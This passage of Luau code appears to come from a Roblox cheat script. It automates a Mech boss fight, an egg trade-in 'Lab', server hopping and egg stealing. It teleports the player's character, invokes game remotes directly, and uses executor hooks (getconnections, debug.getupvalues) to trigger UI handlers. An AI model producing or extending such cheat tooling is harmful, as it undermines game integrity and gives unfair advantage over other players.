				local vector = Vector3.new(arg3.Position.X - n7.X, 0, arg3.Position.Z - n7.Z)
				local vector2 = vector.Magnitude > 1 and vector.Unit * 5 or Vector3.zero
				local n8 = Vector3.new(n7.X, arg3.Position.Y, n7.Z) + vector2
				local character = localPlayer.Character

				pcall(function()
					character:PivotTo(CFrame.lookAt(n8, Vector3.new(position.X, n8.Y, position.Z)))
				end)

				fn20()
				mech.Status = string.format("Chasing Dr Scramble  |  hits %s / %s", tostring(arg2:GetAttribute("HumanHits") or 0), tostring(arg2:GetAttribute("HumanNeeded") or 3))
				return true
			end

			local function fn25()
				local v16 = fn13()
				local v17 = tbl4.Root()
				local character = localPlayer.Character
				character = character and character:FindFirstChildOfClass("Humanoid")
				if not v16 or not v17 then
					return
				end
				local str2 = tostring(v16:GetAttribute("Phase"))
				local n7 = tonumber(v16:GetAttribute("Health")) or 0
				local n8 = tonumber(v16:GetAttribute("MaxHealth")) or 0

				if tostring(v16:GetAttribute("GrabVictim")) == tostring(localPlayer.UserId) and character then
					character.Jump = true
					fn20()
					mech.Status = "Grabbed, breaking free"
					return
				end

				if str2 == "Ball" and mech.TryBall and fn23(v16, v17) then
					return
				end

				if str2 == "Human" and fn24(v16, v17) then
					return
				end
				local v18, flag3 = fn22(v16)

				if not v18 then
					local n9 = (tonumber(v16:GetAttribute("SpawnsAt")) or 0) - workspace:GetServerTimeNow()
					mech.Status = n9 > 0 and "In the arena  |  boss spawns in " .. mech.Clock(n9) or string.format("Phase %s, waiting for the boss", str2)
					return
				end

				local serverTimeNow = workspace:GetServerTimeNow()
				local n9 = (tonumber(v16:GetAttribute("FloorY")) or v18.Y) + 3
				local v19 = nil
				local v20 = nil

				for i = 0, 15 do
					local n10 = i / 16 * 3.1415926535897931 * 2
					local vector = Vector3.new
					local radius = mech.Radius
					local n11 = v18.X + math.cos(n10) * radius
					local radius2 = mech.Radius
					local v21 = vector(n11, n9, v18.Z + math.sin(n10) * radius2)
					local magnitude = (v21 - v17.Position).Magnitude

					if fn18(v21, serverTimeNow) or fn18(v21, serverTimeNow + 0.4) then
						magnitude += 10000
					end

					if not v19 or magnitude < v19 then
						v19 = magnitude
						v20 = v21
					end
				end

				if v20 then
					fn21(v20, v18)
				end

				fn20()
				flag3 = flag3 and flag3:GetAttribute("Overheated") == true
				mech.Status = string.format("Fighting %s  |  boss %d / %d%s", str2, math.floor(n7 + 0.5), math.floor(n8 + 0.5), flag3 and "  |  OVERHEAT" or "")
			end

			local function fn26()
				local v16 = fn13()
				local v17 = fn16(v16 and v16:FindFirstChild("LeaveTeleport"))
				if not v17 then
					return
				end
				local character = localPlayer.Character

				pcall(function()
					character:PivotTo(CFrame.new(v17.Position + Vector3.new(0, 3, 0)))
				end)

				task.wait(0.2)
				fn17(v17)
			end

			local function fn27(arg2)
				local v16 = fn14()
				local v17 = fn16(v16)
				if not v16 or not v17 then
					return false
				end
				local flag3 = type(tbl4.StealHome) == "function" and tbl4.StealHome() or nil

				if flag3 and tbl4.InsideBase() then
					local flag4 = mech.Respawned == true
					local n7 = flag3 + Vector3.new(0, 3, 0)
					local travelSpeed = flag4 and math.min(mech.TravelSpeed, 300) or mech.TravelSpeed
					local now = os.clock()
					local exitTo = nil

					while true do
						if not (os.clock() - now < 20) then
							exitTo = 1
							break
						else
							if arg2 ~= mech.Generation or not fn12() or fn15() or mech.StealFirst() then
								exitTo = 2
								break
							else
								local v18 = tbl4.Root()

								if v18 then
									local n8 = n7 - v18.Position

									if n8.Magnitude <= 4 then
										exitTo = 1
										break
									else
										mech.Status = flag4 and "Respawned, going out through the safe zone" or "Leaving the base through the safe zone"
										local magnitude = n8.Magnitude
										local n9 = math.min(travelSpeed * RunService.Heartbeat:Wait(), magnitude)

										pcall(function()
											local rotation = v18.CFrame.Rotation
											v18.CFrame = CFrame.new(v18.Position + n8.Unit * n9) * rotation
											v18.AssemblyLinearVelocity = Vector3.zero
										end)

										continue
									end
								end
							end

							break
						end
					end

					if exitTo ~= 1 then
						if exitTo == 2 then
							return false
						end
						return false
					end

					if flag4 then
						mech.Status = "Respawned, resting in the safe zone"
						local n8 = 0

						while n8 < 0.75 do
							local v18 = tbl4.Root()

							if v18 then
								pcall(function()
									v18.AssemblyLinearVelocity = Vector3.zero
								end)
							end

							n8 += RunService.Heartbeat:Wait()
						end
					end
				end

				mech.Respawned = false

				for i = 1, 5 do
					if not (arg2 ~= mech.Generation or not fn12() or fn15() or mech.StealFirst()) then
						local v18 = tbl4.Root()

						if not (not v18 or not v17.Parent) then
							mech.Status = "Teleporting to the Mech portal"

							pcall(function()
								v18.CFrame = v17.CFrame + Vector3.new(0, 1, 0)
								v18.AssemblyLinearVelocity = Vector3.zero
								v18.AssemblyAngularVelocity = Vector3.zero
							end)

							fn17(v17)
							local n7 = os.clock() + 0.6

							while os.clock() < n7 and not fn15() do
								RunService.Heartbeat:Wait()
							end

							continue
						end
					end

					break
				end

				if fn15() then
					return true
				end
				local position = v17.Position
				local now = os.clock()
				local exitTo2 = nil
				local v18

				while true do
					if not (os.clock() - now < 60) then
						exitTo2 = 1
						break
					else
						if arg2 ~= mech.Generation or not fn12() or fn15() or mech.StealFirst() then
							exitTo2 = 1
							break
						else
							v18 = tbl4.Root()

							if not v18 then
								exitTo2 = 2
								break
							else
								local vector = Vector3.new(position.X - v18.Position.X, 0, position.Z - v18.Position.Z)

								if not (vector.Magnitude <= 14) then
									local n7 = vector.Unit * math.min(mech.TravelSpeed, vector.Magnitude / 0.05)
									mech.Status = string.format("Going to the Mech portal, %d studs", math.floor(vector.Magnitude + 0.5))

									pcall(function()
										v18.AssemblyLinearVelocity = Vector3.new(n7.X, v18.AssemblyLinearVelocity.Y, n7.Z)
									end)

									RunService.Heartbeat:Wait()
									continue
								end
							end
						end

						break
					end
				end

				if exitTo2 ~= 1 then
					if exitTo2 == 2 then
						return false
					end

					pcall(function()
						v18.AssemblyLinearVelocity = Vector3.zero
					end)

					fn17(v17)
					task.wait(0.4)

					if not fn15() then
						pcall(function()
							local rfScrambleBossEnterArena = networking:FindFirstChild("RF/ScrambleBoss/EnterArena")

							if rfScrambleBossEnterArena then
								rfScrambleBossEnterArena:InvokeServer()
							end
						end)
					end
				end

				local now2 = os.clock()

				while not fn15() and os.clock() - now2 < 5 do
					task.wait(0.1)
				end

				return fn15()
			end

			local function fn28()
				mech.Busy = true
				mech.Generation = mech.Generation + 1
				local generation = mech.Generation
				tbl4.Shield("mech", true)

				pcall(function()
					if tbl4.Treadmill and tbl4.Treadmill.Riding or type(tbl4.OnBelt) == "function" and tbl4.OnBelt() then
						tbl4.ExitBelt()
					end
				end)

				if not fn15() and not mech.StealFirst() then
					pcall(fn27, generation)
				end

				while generation == mech.Generation and fn12() and fn15() and not mech.StealFirst() do
					local v16 = fn13()
					local str2 = v16 and tostring(v16:GetAttribute("Phase")) or ""

					if str2 == "Defeated" or str2 == "Final" or str2 == "Ended" or str2 == "Won" then
						mech.Status = "Dr Scramble defeated, going back home"

						if not mech.DefeatedAt and type(mech.StartChain) == "function" then
							pcall(mech.StartChain)
						end

						mech.DefeatedAt = mech.DefeatedAt or os.clock()
						local leave = mech.Leave

						if leave then
							local defeatedAt = mech.DefeatedAt
							leave = os.clock() - defeatedAt > 1
						end

						if leave then
							pcall(fn26)
							task.wait(2)
						else
							task.wait(0.3)
						end
					else
						pcall(fn25)
						RunService.Heartbeat:Wait()
					end
				end

				if fn15() and mech.StealFirst() then
					mech.Status = tostring(mech.StealFirst()) .. ", leaving the arena"
					pcall(fn26)
					local n7 = 0

					while fn15() and n7 < 5 do
						n7 += task.wait(0.2)
					end
				end

				mech.DefeatedAt = nil
				mech.Run = nil
				tbl4.Shield("mech", false)
				tbl4.ReleaseMovement("mech")
				mech.Busy = false
				tbl3.Wake()
			end

			pcall(function()
				local reScrambleBossHazard = networking:FindFirstChild("RE/ScrambleBoss/Hazard")

				if reScrambleBossHazard and reScrambleBossHazard:IsA("RemoteEvent") then
					table.insert(mech.Links, reScrambleBossHazard.OnClientEvent:Connect(function(arg2)
						if type(arg2) == "table" then
							mech.Hazards[arg2.Id or #mech.Hazards + 1] = arg2
						end
					end))
				end
			end)

			table.insert(mech.Links, localPlayer.CharacterAdded:Connect(function()
				mech.Respawned = true
			end))

			mech.Row = arg:CreateText({ Name = "Mech Status", Text = "Idle" })

			mech.Handle = arg:CreateToggle({
				Name = "Auto Mech Boss",
				Default = false,
				Callback = function()
					if not fn12() then
						mech.Generation = mech.Generation + 1
					end

					tbl3.Wake()
				end,
			})

			for _, v16 in ipairs({
				{ "Mech Tween Speed", 100, 1000, 250, 10, "studs/s", "TravelSpeed" },
				{ "Main Weapon Hold", 0, 1.5, 0.3, 0.01, "s", "MainHold" },
				{ "Scrambler Hold", 0, 1.5, 0.4, 0.01, "s", "SecondHold" },
			}) do
				arg:CreateSlider({
					Name = v16[1],
					Min = v16[2],
					Max = v16[3],
					Default = v16[4],
					Increment = v16[5],
					Unit = v16[6],
					SubOf = mech.Handle,
					Callback = function(arg2)
						mech[v16[7]] = math.clamp(tonumber(arg2) or v16[4], v16[2], v16[3])
					end,
				})
			end

			for _, v16 in ipairs({
				{ "Swap Two Weapons", "SwapTools" },
				{ "Dodge Attacks", "Dodge" },
				{ "Ball And Core Phase", "TryBall" },
				{ "Leave After Fight", "Leave" },
			}) do
				arg:CreateToggle({
					Name = v16[1],
					Default = true,
					SubOf = mech.Handle,
					Callback = function(arg2)
						mech[v16[2]] = arg2 ~= false
					end,
				})
			end

			mech.HopHandle = arg:CreateToggle({
				Name = "Boss Server Hop",
				Note = "After each boss, hops to a less crowded server to fight again",
				Default = false,
				SubOf = mech.Handle,
				Callback = function()
					mech.HopAt = nil

					if not tbl4.Toggle(mech.HopHandle, false) then
						mech.HopConfirmed = false
						mech.HopNote = nil
						pcall(tbl4.HopPrompt.Hide)
						return
					end

					mech.ArmedCycle = math.floor(workspace:GetServerTimeNow() / mech.Interval)
					if not tbl4.HopPrompt.Manual() then
						mech.HopConfirmed = true
						return
					end
					mech.ArrivedByHop = false
					mech.HopConfirmed = false

					if not pcall(tbl4.HopPrompt.Show, {
						Title = "Boss Server Hop",
						Warn = "WARNING",
						Body = "After you beat a Mech boss, Boss Server Hop keeps joining less crowded servers. It fights the boss wherever one is still up and hops again when there is none. Turn it off to stop hopping.",
						Tip = "",
						Cancel = "Cancel",
						Accept = "Turn On",
					}, function()
						mech.HopConfirmed = true
						tbl3.Wake()
					end, function()
						pcall(function()
							mech.HopHandle:Set(false)
						end)
					end) then
						mech.HopConfirmed = true
					end
				end,
			})

			mech.PortalCloses = function()
				local interval = mech.Interval
				return math.floor(workspace:GetServerTimeNow() / mech.Interval) * interval + mech.OpenSeconds
			end

			mech.SaveChain = function()
				if type(writefile) ~= "function" then
					return
				end

				pcall(function()
					if type(isfolder) == "function" and type(makefolder) == "function" and not isfolder("ChilliLibrary") then
						makefolder("ChilliLibrary")
					end

					writefile(mech.ChainPath, game:GetService("HttpService"):JSONEncode({ Until = mech.ChainUntil, Cycle = mech.ChainCycle, HopAt = mech.HopStamp }))
				end)
			end

			mech.StartChain = function()
				if not tbl4.Toggle(mech.HopHandle, false) or not mech.HopConfirmed then
					return
				end
				local serverTimeNow = workspace:GetServerTimeNow()
				local chainCycle = math.floor(serverTimeNow / mech.Interval)
				if mech.ChainUntil > serverTimeNow or mech.ChainCycle == chainCycle and mech.ArrivedByHop then
					return
				end
				mech.ChainCycle = chainCycle
				mech.ChainUntil = math.min(serverTimeNow + mech.HopWindow * 60, mech.PortalCloses())
				mech.SaveChain()
			end

			pcall(function()
				if type(isfile) == "function" and isfile(mech.ChainPath) then
					local data = game:GetService("HttpService"):JSONDecode(readfile(mech.ChainPath))

					if type(data) == "table" then
						mech.ChainUntil = tonumber(data.Until) or 0
						mech.ChainCycle = tonumber(data.Cycle)
						mech.HopStamp = tonumber(data.HopAt) or 0
						mech.ArrivedByHop = workspace:GetServerTimeNow() - mech.HopStamp < 120
					end
				end
			end)

			arg:CreateSlider({
				Name = "Keep Hopping For",
				Note = "Keeps fighting every boss it finds and hopping for this long",
				Min = 1,
				Max = 15,
				Default = 3,
				Increment = 1,
				Unit = "min",
				SubOf = mech.Handle,
				Callback = function(arg2)
					mech.HopWindow = math.clamp(math.floor(tonumber(arg2) or 3), 1, 15)
				end,
			})

			tbl3.Add(function()
				if not fn12() or not tbl4.Toggle(mech.HopHandle, false) or not mech.HopConfirmed then
					mech.HopAt = nil
					mech.HopNote = nil
					return false
				end

				if mech.Hopping then
					return false
				end
				local serverTimeNow = workspace:GetServerTimeNow()

				if mech.ChainUntil > 0 and serverTimeNow >= mech.ChainUntil then
					mech.ChainUntil = 0
					mech.SaveChain()
				end

				if mech.ChainUntil <= serverTimeNow then
					local n7 = math.floor(serverTimeNow / mech.Interval)
					local n8 = serverTimeNow - n7 * mech.Interval
					local flag3 = (mech.ArmedCycle == n7 or mech.ChainCycle ~= n7) and n8 >= 20 and n8 < mech.OpenSeconds

					if flag3 then
						local loadedAt = mech.LoadedAt
						flag3 = os.clock() - loadedAt >= 8
					end

					if flag3 and not mech.Busy and not fn15() and not fn14() then
						pcall(mech.StartChain)
					end

					if mech.ArmedCycle ~= n7 then
						mech.ArmedCycle = nil
					end
				end

				if mech.ChainUntil <= serverTimeNow then
					local interval = mech.Interval
					local n7 = serverTimeNow - math.floor(serverTimeNow / mech.Interval) * interval
					mech.HopAt = nil

					if mech.OpenSeconds <= n7 then
						mech.HopNote = "Boss hop waits for the next portal"
					elseif mech.ArrivedByHop and mech.ChainCycle == math.floor(serverTimeNow / mech.Interval) then
						mech.HopNote = "Boss hop is done for this portal"
					elseif mech.Busy or fn15() or fn14() then
						mech.HopNote = "Boss hop starts after this boss"
					else
						mech.HopNote = "Looking for the boss here"
					end

					return false
				end

				local n7 = mech.ChainUntil - serverTimeNow

				if mech.Busy or fn15() or fn14() then
					mech.HopAt = nil
					mech.HopNote = "Boss hop on, " .. mech.Clock(n7) .. " left"
					return false
				end

				local loadedAt = mech.LoadedAt

				if os.clock() - loadedAt < 8 then
					mech.HopAt = nil
					mech.HopNote = "Looking for the boss here"
					return false
				end

				local steal = tbl4.Steal
				local flag3 = tbl4.Toggle(v5, false) == true and steal

				if flag3 then
					flag3 = steal.Wanted == true or steal.Carrying == true or steal.Active == true
				end

				if flag3 then
					mech.HopAt = nil
					mech.HopNote = "A filtered egg is here, stealing before the hop"
					return false
				end

				local v16 = mech
				local hopAt = mech.HopAt

				if not hopAt then
					local hopDelay = mech.HopDelay
					hopAt = os.clock() + hopDelay
				end

				v16.HopAt = hopAt
				local hopAt2 = mech.HopAt
				if os.clock() < hopAt2 then
					mech.HopNote = string.format("No boss here, hopping in %ds  |  %s left", math.ceil(mech.HopAt - os.clock()), mech.Clock(n7))
					return false
				end

				if type(tbl4.ServerHop) ~= "function" then
					mech.HopNote = "Server hop is not ready"
					return false
				end
				mech.Hopping = true
				mech.HopNote = "Joining a less crowded server"
				mech.HopStamp = workspace:GetServerTimeNow()
				mech.SaveChain()

				task.spawn(function()
					local ok2, result2 = pcall(tbl4.ServerHop, "Least Players")
					local str2 = ok2 and tostring(result2) or "error"
					mech.Hopping = false

					if str2 == "waiting" then
						mech.HopAt = os.clock() + 15
						mech.HopNote = "Teleporting to the next server"
					elseif str2 == "fetch" then
						mech.HopAt = os.clock() + 10
						mech.HopNote = "Server list unavailable, trying again soon"
					else
						mech.HopAt = os.clock() + 3
						mech.HopNote = "Hop did not land, trying again"
					end
				end)

				return false
			end)

			tbl3.Add(function()
				local row = mech.Row

				if not fn12() then
					mech.Status = "Off  |  " .. mech.Timer()
				elseif not mech.Busy then
					if fn15() then
						mech.Status = "In the arena"
					else
						mech.Status = mech.Timer()
					end

					if mech.HopNote then
						mech.Status = mech.Status .. "  |  " .. mech.HopNote
					end
				end

				if row and mech.Shown ~= mech.Status and type(row.Set) == "function" then
					mech.Shown = mech.Status
					pcall(row.Set, row, mech.Status)
				end

				local invisibilityHandle = tbl4.InvisibilityHandle
				local flag3 = invisibilityHandle ~= nil and tbl4.Toggle(invisibilityHandle, false)
				local busy = fn12()

				if busy then
					busy = mech.Busy or fn15() or fn14()
				end

				if busy then
					mech.InvisResumeAt = nil

					if not tbl4.InvisMech then
						tbl4.InvisMech = true

						if flag3 then
							tbl4.Notify("Invisibility", "Invisibility is paused for the Mech boss and comes back after it.")
						end
					end
				elseif tbl4.InvisMech and not mech.Busy then
					mech.InvisResumeAt = mech.InvisResumeAt or os.clock() + 5

					if mech.InvisResumeAt <= os.clock() then
						mech.InvisResumeAt = nil
						tbl4.InvisMech = false

						if flag3 then
							tbl4.Notify("Invisibility", "The Mech boss is over, Invisibility is back on.")
						end
					end
				end

				if not fn12() or mech.Busy then
					return true
				end

				if fn15() or fn14() then
					local v16 = mech.StealFirst()
					if v16 then
						mech.Status = v16 .. "  |  " .. mech.Timer()
						return true
					end
					local character = localPlayer.Character
					if character and character:GetAttribute("InvisApplied") == true then
						mech.Status = "Leaving Invisibility for the boss"
						return true
					end

					if not tbl4.ClaimMovement("mech") then
						mech.Status = "Waiting for " .. tostring(tbl4.Movement.Owner or "movement")
						return true
					end
					task.spawn(fn28)
					return true
				end

				return true
			end)

			fn4(function()
				tbl4.InvisMech = false
				mech.Generation = mech.Generation + 1

				for _, link in ipairs(mech.Links) do
					pcall(function()
						link:Disconnect()
					end)
				end

				pcall(tbl4.Shield, "mech", false)
				pcall(tbl4.ReleaseMovement, "mech")
			end)
		end

		tbl4.MechBoot(v7)

		do
			local n7 = 1
			local n8 = 1
			local v16 = nil
			local v17 = nil
			local flag3 = false
			local n9 = 0
			local n10 = 0
			local n11 = 0
			local v18 = nil
			local n12 = 0
			local str2 = ""
			local flag4 = false

			local function fn12(arg, arg2)
				local v19 = networking:FindFirstChild(arg)
				if not v19 or not v19:IsA("RemoteFunction") then
					return false, nil, nil
				end

				if arg2 == nil then
					return pcall(v19.InvokeServer, v19)
				end
				return pcall(v19.InvokeServer, v19, arg2)
			end

			local function fn13()
				local save2 = tbl.Save
				if type(save2) ~= "table" or type(save2.Get) ~= "function" then
					return nil
				end
				local ok, result = pcall(save2.Get)
				return ok and type(result) == "table" and result or nil
			end

			local function fn14(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				local flag5 = type(directory) == "table" and directory[tostring(arg)] or nil
				return tostring(type(flag5) == "table" and flag5.DisplayName or arg)
			end

			local function fn15(arg)
				if not arg and type(v18) == "table" and os.clock() < n11 then
					return v18
				end
				n11 = os.clock() + n8
				local AskState, v19 = fn12("RF/ScrambleTradeIn/AskState")

				if AskState and type(v19) == "table" then
					v18 = v19
					n12 = os.clock()
				end

				return v18
			end

			local function fn16()
				local tbl25 = {}
				local eggState = tbl.EggState

				if type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function" then
					local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)

					if ok and type(result) == "table" then
						for k, v19 in pairs(result) do
							if type(v19) == "table" and v19.Placement ~= nil then
								tbl25[k] = true
							end
						end
					end
				end

				return tbl25
			end

			local function fn17(arg, arg2)
				local requirements = type(arg) == "table" and arg.Requirements or nil
				if type(requirements) ~= "table" or #requirements == 0 then
					return nil, "No active recipe", {}
				end
				local v19 = fn16()
				local tbl25 = {}
				local tbl26 = {}

				for _, requirement in ipairs(requirements) do
					tbl25[tostring(requirement)] = {}
				end

				local v20 = pairs
				local eggInventory = arg2.EggInventory or {}

				for k, v21 in v20(eggInventory) do
					local str3 = type(v21) == "table" and tostring(v21.AssetCategory) or nil
					local v22 = str3 and tbl25[str3] or nil

					if v22 then
						if v19[k] then
							tbl26[str3] = true
						else
							local flag5 = v21.BaseMutation ~= nil and v21.BaseMutation ~= "Normal" or type(v21.Mutations) == "table" and next(v21.Mutations) ~= nil
							table.insert(v22, { Uid = k, Scale = tonumber(v21.AssetScale) or 0, Mutated = flag5 })
						end
					end
				end

				for _, v21 in pairs(tbl25) do
					table.sort(v21, function(arg3, arg4)
						if arg3.Mutated ~= arg4.Mutated then
							return arg4.Mutated
						end
						return arg3.Scale < arg4.Scale
					end)
				end

				local tbl27 = {}
				local tbl28 = {}
				local tbl29 = {}
				local str3 = nil

				for i, requirement in ipairs(requirements) do
					local tbl30 = tbl25[tostring(requirement)]
					local v21 = ipairs
					tbl30 = tbl30 or {}
					local v22 = nil

					for _, v23 in v21(tbl30) do
						if not tbl28[v23.Uid] then
							v22 = v23
							break
						else
							v22 = nil
						end
					end

					if v22 then
						tbl28[v22.Uid] = true
						tbl29[i] = v22.Uid
						table.insert(tbl27, v22.Uid)
					elseif not str3 then
						if tbl26[tostring(requirement)] then
							str3 = "Need a " .. fn14(requirement) .. " egg, yours is placed on a nest"
						else
							str3 = "Need a " .. fn14(requirement) .. " egg"
						end
					end
				end

				if str3 then
					return nil, str3, tbl28, tbl29
				end
				return tbl27, nil, tbl28, tbl29
			end

			local tbl25 = {}

			local function fn18()
				local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
				playerGui = playerGui and playerGui:FindFirstChild("DrScrambleTradeIn")
				local drScrambleTradeInMain = playerGui and playerGui:FindFirstChild("DrScrambleTradeInMain")
				playerGui = playerGui and playerGui:FindFirstChild("DrScrambleTradeInInventory", true)
				local sacrificeInputs = drScrambleTradeInMain and drScrambleTradeInMain:FindFirstChild("SacrificeInputs")
				if not drScrambleTradeInMain or not playerGui or not sacrificeInputs then
					return nil
				end
				return { Main = drScrambleTradeInMain, Inventory = playerGui, Inputs = sacrificeInputs }
			end

			local function fn19(arg)
				if typeof(arg) ~= "Instance" or not arg:IsA("GuiButton") then
					return false
				end
				local ok, result = pcall(getconnections, arg.Activated)
				if not ok or type(result) ~= "table" or #result == 0 then
					return false
				end
				local flag5 = false

				for _, v19 in ipairs(result) do
					local ok2, result2 = pcall(function()
						return v19.Function
					end)

					ok2 = ok2 and type(result2) == "function"
					local v20 = nil

					if ok2 then
						local ok3, result3 = pcall(debug.getupvalues, result2)
						ok3 = ok3 and type(result3) == "table"
						v20 = nil

						if ok3 then
							v20 = nil

							for i = 1, #result3 do
								if type(result3[i]) == "function" then
									v20 = result3[i]
									break
								else
									v20 = nil
								end
							end
						end
					end

					if v20 then
						flag5 = pcall(v20) or flag5
					else
						flag5 = pcall(function()
							v19:Fire()
						end) or flag5
					end
				end

				return flag5
			end

			local function fn20(arg)
				arg = arg and arg:FindFirstChild("Full")
				return arg ~= nil and arg.Visible == true
			end

			local function fn21(arg, arg2)
				for i = 1, arg2 do
					if not fn20(arg.Inputs:FindFirstChild("Input" .. i)) then
						return false
					end
				end

				return arg2 > 0
			end

			local function fn22(arg, arg2)
				local v19 = fn18()
				local requirements = type(arg) == "table" and arg.Requirements or nil
				if not v19 or type(requirements) ~= "table" then
					return false
				end

				for i = 1, #requirements do
					local v20 = v19.Inputs:FindFirstChild("Input" .. i)
					local v21 = arg2[i]
					local flag5 = v20 and v21 and not fn20(v20)

					if flag5 then
						flag5 = (tbl25[v21] or 0) <= os.clock()
					end

					if flag5 then
						local empty = v20:FindFirstChild("Empty")

						if fn19(empty and empty:FindFirstChild("Add")) then
							local scrollingFrame = v19.Inventory:FindFirstChild("ScrollingFrame")
							local n13 = 0
							local v22 = nil

							while n13 < 2 do
								v22 = scrollingFrame and scrollingFrame:FindFirstChild("Egg_" .. v21)
								if not v22 then
									n13 += task.wait(0.1)
									continue
								end
								break
							end

							if v22 then
								fn19(v22)
							end

							local n14 = 0

							while n14 < 2 and not fn20(v20) do
								n14 += task.wait(0.1)
							end

							if v19.Inventory.Visible then
								if not fn19(v19.Inventory:FindFirstChild("Close")) then
									v19.Inventory.Visible = false
								end
							end
						end

						if not fn20(v20) then
							tbl25[v21] = os.clock() + 30
						end
					end
				end

				return fn21(v19, #requirements)
			end

			local function fn23()
				local v19 = v18
				if type(v19) ~= "table" then
					return "Lab status unknown"
				end

				if v19.Unlocked ~= true then
					return "Lab is locked on this account"
				end
				local tbl26 = {}
				local v20 = ipairs
				local requirements = v19.Requirements or {}

				for _, requirement in v20(requirements) do
					table.insert(tbl26, fn14(requirement))
				end

				local n13 = (tonumber(v19.SecondsUntilRotation) or 0) - os.clock() - n12

				if n13 < 0 then
					n13 = 0
				end

				local str3 = string.format("%s  -  needs %s  -  pity %s/%s  -  free rerolls %s  -  rotates in %d:%02d", tostring(v19.BannerDisplayName or v19.BannerId or "Lab"), #tbl26 > 0 and table.concat(tbl26, ", ") or "unknown", tostring(v19.PityCount or 0), tostring(v19.PityThreshold or 0), tostring(v19.FreeRefreshesRemaining or 0), math.floor(n13 / 60), math.floor(n13 % 60))
				local str4

				if str2 ~= "" then
					str4 = str3 .. "  -  " .. str2
				else
					str4 = str3
				end

				return str4
			end

			local function fn24(arg)
				local v19 = fn15(true)
				if type(v19) ~= "table" or v19.Unlocked ~= true then
					return
				end

				if v19.PendingReward ~= nil and v19.PendingReward ~= false then
					local AskFinishReveal, v20 = fn12("RF/ScrambleTradeIn/AskFinishReveal")
					str2 = AskFinishReveal and v20 ~= false and "Reward claimed" or "Reward claim failed"
					n11 = 0
					return
				end

				if not tbl4.Lab.BannerOk(v19.BannerId) then
					tbl4.Lab.Reserved = {}
					str2 = "Waiting for " .. tbl4.Lab.PickedText()
					return
				end

				local v20 = fn13()
				if not v20 then
					return
				end
				local v21, v22, v23, v24 = fn17(v19, v20)
				local flag5 = tbl4.Toggle(v16, false)
				tbl4.Lab.Reserved = flag5 and v23 or {}
				flag5 = flag5 and arg == n9
				local flag6 = false

				if flag5 then
					local result
					flag6, result = pcall(fn22, v19, v24 or {})
					flag6 = flag6 and result == true
				end

				if not v21 then
					str2 = v22 or "Recipe not ready"
					local flag7 = arg == n9 and tbl4.Toggle(v17, false)
					local flag8

					if flag7 then
						flag8 = (tonumber(v19.FreeRefreshesRemaining) or 0) > 0
					else
						flag8 = flag7
					end

					if flag8 then
						local AskRefresh, v25, v26 = fn12("RF/ScrambleTradeIn/AskRefresh")

						if AskRefresh and v25 ~= false then
							str2 = "Recipe rerolled"
						else
							str2 = tostring(v26 or "Reroll rejected")
						end

						n11 = 0
					end

					return
				end

				if not tbl4.Toggle(v16, false) then
					str2 = "Ready to trade in"
					return
				end

				if arg ~= n9 then
					return
				end

				if flag6 then
					local v25 = fn18()

					if v25 and fn19(v25.Main:FindFirstChild("Sacrifice", true)) then
						str2 = "Trade-in sent"
						n11 = 0
						return
					end
				end

				local AskTradeIn, v25, v26 = fn12("RF/ScrambleTradeIn/AskTradeIn", v21)

				if AskTradeIn and v25 ~= false then
					str2 = "Trade-in sent"
				else
					str2 = tostring(v26 or "Trade rejected")
				end

				n11 = 0
			end

			local v19 = v7:CreateText({ Name = "Lab Status", Text = "Loading Lab data..." })
			local tbl26 = {}
			local tbl27 = {}

			for _, v20 in ipairs(tbl4.Lab.BannerList()) do
				table.insert(tbl26, v20.Name)
				tbl27[v20.Name] = v20.Id
			end

			fn6(v7:CreateMultiDropdown({
				Name = "Lab Banners",
				Note = "Only trade and steal for these banners (empty = all)",
				Options = tbl26,
				Default = {},
				Callback = function(arg)
					local banners = {}

					if type(arg) == "table" then
						for k, v20 in pairs(arg) do
							k = v20 == true and type(k) == "string" and k or type(v20) == "string" and v20 or nil

							if k and tbl27[k] then
								banners[tbl27[k]] = true
							end
						end
					end

					tbl4.Lab.Banners = banners
					str2 = ""
					n10 = 0
					n11 = 0
					tbl4.Rift.Next = 0

					if type(tbl4.Lab.ForceSteal) == "function" then
						pcall(tbl4.Lab.ForceSteal)
					end

					tbl3.Wake()
				end,
			}))

			v16 = v7:CreateToggle({
				Name = "Auto Lab Trade-In",
				Default = false,
				Callback = function()
					if not tbl4.Toggle(v16, false) then
						tbl4.Lab.Reserved = {}
					end

					n9 += 1
					str2 = ""
					n10 = 0
					n11 = 0
					tbl3.Wake()
				end,
			})

			v17 = v7:CreateToggle({
				Name = "Auto Reroll Lab Recipe",
				Default = false,
				Callback = function()
					n9 += 1
					str2 = ""
					n10 = 0
					n11 = 0
					tbl3.Wake()
				end,
			})

			tbl4.Lab.PlaceHandle = v7:CreateToggle({
				Name = "Auto Place Lab Reward Eggs",
				Note = "Places the reward eggs from Lab trades",
				Default = false,
				Callback = function(arg)
					if type(arg) ~= "boolean" then
						arg = tbl4.Toggle(tbl4.Lab.PlaceHandle, false)
					end

					tbl4.Lab.PlaceOn = arg == true

					if type(tbl4.PlaceEggRefresh) == "function" then
						pcall(tbl4.PlaceEggRefresh)
					end

					tbl3.Wake()
				end,
			})

			tbl3.Add(function()
				local v20 = tbl4.Toggle(v16, false)
				local v21 = tbl4.Toggle(v17, false)
				local n13 = (v20 or v21) and 1 or 30
				local flag5 = not flag4

				if flag5 then
					flag5 = v18 == nil or n11 == 0 or os.clock() - n12 >= n13
				end

				if flag5 then
					flag4 = true

					task.spawn(function()
						pcall(fn15, true)
						flag4 = false
					end)
				end

				if v19 and type(v19.Set) == "function" then
					pcall(v19.Set, v19, fn23())
				end

				local flag6 = flag3

				if not flag3 then
					flag6 = not (v20 or v21)
				end

				if flag6 or os.clock() < n10 then
					return false
				end
				flag3 = true
				n10 = os.clock() + n7
				local v22 = n9

				task.spawn(function()
					pcall(fn24, v22)
					flag3 = false
					tbl3.Wake()
				end)

				return false
			end)
		end

		local n7
		n7 = 6
		local n8
		n8 = 1.5
		local n9
		n9 = 400
		local vector
		vector = Vector3.new(2120, -120, -355)
		local tbl25
		tbl25 = { "LostPart1", "LostPart2" }
		local tbl26

		tbl26 = {
			{ Label = "Scrambled Mutation", Id = "MutationConsumable" },
			{ Label = "2x Cash Booster", Id = "CashBooster" },
			{ Label = "1.25x Speed", Id = "SpeedBoost" },
			{ Label = "2x Treadmill Booster", Id = "TreadmillBooster" },
		}

